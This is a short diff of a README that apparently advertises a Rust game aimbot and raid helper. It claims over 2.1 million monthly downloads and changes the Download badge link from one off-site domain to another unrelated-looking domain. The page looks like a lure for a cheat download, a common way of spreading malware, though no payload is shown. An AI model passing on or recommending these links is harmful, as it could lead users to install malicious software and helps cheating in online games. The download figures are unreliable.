@@ -49,7 +49,7 @@ A: Yes — shows resources needed to raid any base.
 
 **Monthly downloads:** 2.1m+
 
-[![Download](https://img.shields.io/badge/Download-v3.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/rustaimbot26)
+[![Download](https://img.shields.io/badge/Download-v3.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/rustaimbot26)
 
 ---
 
